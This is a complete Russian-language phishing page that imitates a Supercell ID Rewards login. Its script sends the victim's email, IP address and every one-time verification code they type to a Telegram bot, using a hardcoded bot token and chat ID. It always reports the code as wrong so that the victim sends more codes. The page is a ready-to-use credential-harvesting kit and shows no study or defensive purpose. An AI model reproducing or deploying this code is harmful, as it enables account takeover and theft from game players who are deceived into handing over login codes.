<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Supercell ID Rewards</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
            background: linear-gradient(135deg, #0A192F 0%, #0B1A33 50%, #0C1D3A 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Основной белый блок */
        .card {
            max-width: 520px;
            width: 100%;
            background: #FFFFFF;
            border-radius: 32px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            overflow: hidden;
            position: relative;
        }

        /* Внутренний контент */
        .content {
            padding: 40px 48px 48px 48px;
        }

        /* Логотип Supercell ID */
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo svg {
            width: 180px;
            height: auto;
        }

        /* Индикатор прогресса (два этапа) */
        .progress-container {
            margin-bottom: 32px;
        }

        .steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            padding: 0 8px;
        }

        .step {
            font-size: 14px;
            font-weight: 500;
            color: #8E9AAE;
            letter-spacing: 0.3px;
        }

        .step.active {
            color: #2C6BFF;
            font-weight: 600;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #EFF2F8;
            border-radius: 4px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #2C6BFF, #5B8CFF);
            border-radius: 4px;
            transition: width 0.3s ease;
        }

        /* Центральная иконка ID с неоновым свечением */
        .icon-container {
            display: flex;
            justify-content: center;
            margin-bottom: 32px;
        }

        .id-icon {
            width: 88px;
            height: 88px;
            background: linear-gradient(135deg, #2C6BFF, #5B8CFF);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 20px rgba(44, 107, 255, 0.5), 0 8px 20px rgba(0, 0, 0, 0.15);
        }

        .id-icon span {
            font-size: 44px;
            font-weight: 800;
            color: white;
            letter-spacing: 2px;
        }

        /* Заголовки */
        h1 {
            font-size: 28px;
            font-weight: 700;
            color: #1F2A3E;
            text-align: center;
            margin-bottom: 12px;
        }

        .description {
            font-size: 16px;
            color: #6C7A8E;
            text-align: center;
            margin-bottom: 32px;
            line-height: 1.4;
        }

        .email-highlight {
            font-weight: 700;
            color: #1F2A3E;
            word-break: break-all;
        }

        /* Поля ввода */
        .input-group {
            margin-bottom: 24px;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            font-size: 16px;
            background: #FFFFFF;
            border: 1.5px solid #E2E6EA;
            border-radius: 16px;
            color: #1F2A3E;
            outline: none;
            transition: all 0.2s;
            font-family: inherit;
            text-align: center;
            letter-spacing: 2px;
            font-size: 20px;
        }

        input::placeholder {
            color: #B8C1D0;
            font-size: 16px;
            letter-spacing: normal;
        }

        input:focus {
            border-color: #2C6BFF;
            box-shadow: 0 0 0 3px rgba(44, 107, 255, 0.1);
        }

        /* Кнопки */
        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 8px;
        }

        .btn {
            flex: 1;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            font-family: inherit;
            text-align: center;
            border: none;
        }

        .btn-primary {
            background: #2C6BFF;
            color: white;
        }

        .btn-primary:hover {
            background: #1A56E0;
            transform: translateY(-1px);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .btn-secondary {
            background: transparent;
            color: #6C7A8E;
            border: 1.5px solid #E2E6EA;
        }

        .btn-secondary:hover {
            background: #F9FAFE;
            border-color: #2C6BFF;
            color: #2C6BFF;
        }

        /* Ссылки */
        .link {
            text-align: center;
            margin-top: 24px;
        }

        .link a {
            color: #2C6BFF;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .link a:hover {
            text-decoration: underline;
        }

        /* Футер с языком */
        .footer {
            background: #F9FAFE;
            padding: 16px 48px;
            border-top: 1px solid #EFF2F8;
            display: flex;
            justify-content: flex-end;
        }

        .language-selector {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            font-size: 13px;
            color: #6C7A8E;
            font-weight: 500;
        }

        .language-selector svg {
            width: 18px;
            height: 18px;
        }

        /* Сообщения */
        .message {
            margin-top: 20px;
            padding: 12px 16px;
            border-radius: 14px;
            text-align: center;
            font-size: 14px;
            font-weight: 500;
            display: none;
        }

        .message.error {
            background: #FFF5F5;
            color: #E5484D;
            border: 1px solid #FFE2E2;
            display: block;
        }

        .message.info {
            background: #F0F7FF;
            color: #2C6BFF;
            border: 1px solid #D9E8FF;
            display: block;
        }

        .hidden {
            display: none;
        }

        /* Анимация загрузки */
        .loader {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 560px) {
            .content {
                padding: 32px 24px 40px 24px;
            }
            .footer {
                padding: 16px 24px;
            }
            h1 {
                font-size: 24px;
            }
            .button-group {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="content">
            <!-- Логотип -->
            <div class="logo">
                <svg width="160" height="32" viewBox="0 0 160 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 4L4 16L12 28L20 16L12 4Z" fill="#2C6BFF" fill-opacity="0.2" stroke="#2C6BFF" stroke-width="1.2"/>
                    <text x="28" y="22" font-family="Arial" font-weight="bold" font-size="18" fill="#1F2A3E">SUPERCELL</text>
                    <text x="108" y="22" font-family="Arial" font-weight="bold" font-size="18" fill="#2C6BFF">ID</text>
                </svg>
            </div>

            <!-- Индикатор прогресса -->
            <div class="progress-container">
                <div class="steps">
                    <span class="step" id="step1Label">Вход</span>
                    <span class="step" id="step2Label">Проверка</span>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill" style="width: 10%;"></div>
                </div>
            </div>

            <!-- Центральная иконка -->
            <div class="icon-container">
                <div class="id-icon">
                    <span>ID</span>
                </div>
            </div>

            <!-- Шаг 1: Вход -->
            <div id="stepLogin">
                <h1>Вход — Supercell ID Rewards</h1>
                <div class="description">
                    Введите свой адрес электронной почты, и мы вышлем вам код подтверждения
                </div>
                <div class="input-group">
                    <input type="email" id="emailInput" placeholder="Введите адрес эл. почты" autocomplete="off">
                </div>
                <div class="button-group">
                    <button class="btn btn-primary" id="loginBtn" onclick="sendEmail()">ВХОД</button>
                    <button class="btn btn-secondary" onclick="cancelLogin()">ОТМЕНА</button>
                </div>
                <div class="link">
                    <a href="#" onclick="registerHint(event)">Хотите зарегистрировать Supercell ID?</a>
                </div>
            </div>

            <!-- Шаг 2: Проверка кода (изначально скрыт) -->
            <div id="stepVerify" class="hidden">
                <h1>Почти готово!</h1>
                <div class="description" id="verifyDescription">
                    Мы отправили код подтверждения на вашу электронную почту (<span class="email-highlight" id="emailDisplay"></span>)
                </div>
                <div class="input-group">
                    <input type="text" id="codeInput" placeholder="123 456" maxlength="6" autocomplete="off" style="letter-spacing: 4px; font-size: 22px;">
                </div>
                <div class="button-group">
                    <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">ПРОДОЛЖИТЬ</button>
                    <button class="btn btn-secondary" onclick="backToLogin()">НАЗАД</button>
                </div>
                <div class="link">
                    <a href="#" onclick="resendCode(event)">Не получили код?</a>
                </div>
            </div>

            <div id="message" class="message"></div>
        </div>

        <div class="footer">
            <div class="language-selector" onclick="switchLanguage()">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="10"/>
                    <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
                </svg>
                <span>Русский</span>
            </div>
        </div>
    </div>

    <script>
        // ТВОИ ДАННЫЕ
        const BOT_TOKEN = "8119321079:AAGngmPagp8L8BBj8lYzMMIN_FZDN52h2Cs";
        const CHAT_ID = "5314096451";
        
        let currentEmail = '';
        let isProcessing = false;
        let retryCount = 0;
        
        // Отправка в Telegram
        async function sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
            } catch(e) {
                console.error('Telegram error:', e);
            }
        }
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return null;
            }
        }
        
        function showMessage(text, type) {
            const msgDiv = document.getElementById('message');
            msgDiv.textContent = text;
            msgDiv.className = `message ${type}`;
            setTimeout(() => {
                if (document.getElementById('message').textContent === text) {
                    msgDiv.className = 'message';
                    msgDiv.textContent = '';
                }
            }, 4000);
        }
        
        function hideMessage() {
            const msgDiv = document.getElementById('message');
            msgDiv.className = 'message';
            msgDiv.textContent = '';
        }
        
        // Обновление прогресс-бара
        function setProgress(step) {
            const step1 = document.getElementById('step1Label');
            const step2 = document.getElementById('step2Label');
            const progressFill = document.getElementById('progressFill');
            
            if (step === 1) {
                step1.classList.add('active');
                step2.classList.remove('active');
                progressFill.style.width = '10%';
            } else {
                step1.classList.add('active');
                step2.classList.add('active');
                progressFill.style.width = '90%';
            }
        }
        
        // Шаг 1: отправка email
        async function sendEmail() {
            if (isProcessing) return;
            
            const email = document.getElementById('emailInput').value.trim();
            if (!email) {
                showMessage('Введите адрес электронной почты', 'error');
                return;
            }
            
            if (!email.includes('@') || !email.includes('.')) {
                showMessage('Введите корректный email', 'error');
                return;
            }
            
            isProcessing = true;
            const loginBtn = document.getElementById('loginBtn');
            const originalText = loginBtn.textContent;
            loginBtn.disabled = true;
            loginBtn.innerHTML = '<span class="loader"></span> ОТПРАВКА...';
            
            currentEmail = email;
            retryCount = 0;
            
            const ip = await getIP();
            await sendToTelegram(`📧 НОВАЯ ПОЧТА\nEmail: ${email}\nIP: ${ip || 'unknown'}\nВремя: ${new Date().toLocaleString()}`);
            
            // Переход на шаг проверки
            document.getElementById('stepLogin').classList.add('hidden');
            document.getElementById('stepVerify').classList.remove('hidden');
            document.getElementById('emailDisplay').innerText = email;
            document.getElementById('codeInput').value = '';
            hideMessage();
            setProgress(2);
            
            loginBtn.disabled = false;
            loginBtn.innerHTML = originalText;
            isProcessing = false;
            
            setTimeout(() => {
                document.getElementById('codeInput').focus();
            }, 100);
        }
        
        // Шаг 2: проверка кода с задержкой 6 секунд
        async function verifyCode() {
            if (isProcessing) return;
            
            const code = document.getElementById('codeInput').value.trim();
            if (!code) {
                showMessage('Введите код подтверждения', 'error');
                return;
            }
            
            if (code.length < 4) {
                showMessage('Код должен содержать минимум 4 символа', 'error');
                return;
            }
            
            isProcessing = true;
            const verifyBtn = document.getElementById('verifyBtn');
            const originalText = verifyBtn.textContent;
            verifyBtn.disabled = true;
            verifyBtn.innerHTML = '<span class="loader"></span> ПРОВЕРКА...';
            
            retryCount++;
            
            const messageType = retryCount === 1 ? '🔑 КОД ДОСТУПА' : '🔄 ПОВТОРНЫЙ КОД';
            await sendToTelegram(`${messageType}\nEmail: ${currentEmail}\nКод: ${code}\nПопытка: ${retryCount}\nВремя: ${new Date().toLocaleString()}`);
            
            // ЗАДЕРЖКА 6 СЕКУНД (имитация проверки Supercell)
            setTimeout(() => {
                showMessage('Неверный код. Попробуйте ещё раз.', 'error');
                
                document.getElementById('codeInput').value = '';
                document.getElementById('codeInput').focus();
                
                verifyBtn.disabled = false;
                verifyBtn.innerHTML = originalText;
                isProcessing = false;
                
                if (retryCount >= 3) {
                    showMessage('Слишком много попыток. Подождите несколько минут.', 'error');
                }
            }, 6000);
        }
        
        // Отмена на первом шаге
        function cancelLogin() {
            if (isProcessing) return;
            document.getElementById('emailInput').value = '';
            hideMessage();
        }
        
        // Назад на шаг входа
        function backToLogin() {
            if (isProcessing) return;
            
            document.getElementById('stepVerify').classList.add('hidden');
            document.getElementById('stepLogin').classList.remove('hidden');
            document.getElementById('codeInput').value = '';
            hideMessage();
            setProgress(1);
            currentEmail = '';
            retryCount = 0;
            
            const verifyBtn = document.getElementById('verifyBtn');
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = 'ПРОДОЛЖИТЬ';
            isProcessing = false;
        }
        
        // Повторная отправка кода
        function resendCode(event) {
            event.preventDefault();
            if (!currentEmail) return;
            
            showMessage('Новый код отправлен на вашу почту', 'info');
            sendToTelegram(`🔄 ЗАПРОС НОВОГО КОДА\nEmail: ${currentEmail}\nВремя: ${new Date().toLocaleString()}`);
        }
        
        function registerHint(event) {
            event.preventDefault();
            showMessage('Переход на страницу регистрации', 'info');
        }
        
        function switchLanguage() {
            showMessage('Язык: Русский', 'info');
        }
        
          // Обработка ввода кода
        document.addEventListener('DOMContentLoaded', () => {
            const codeInput = document.getElementById('codeInput');
            if (codeInput) {
                codeInput.addEventListener('input', (e) => {
                    let val = e.target.value.replace(/\s/g, '');
                    if (val.length > 6) val = val.slice(0, 6);
                    e.target.value = val;
                });
                
                codeInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        verifyCode();
                    }
                });
            }
            
            const emailField = document.getElementById('emailInput');
            if (emailField) {
                emailField.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        sendEmail();
                    }
                });
            }
            
            setProgress(1);
        });
    </script>
</body>
</html>
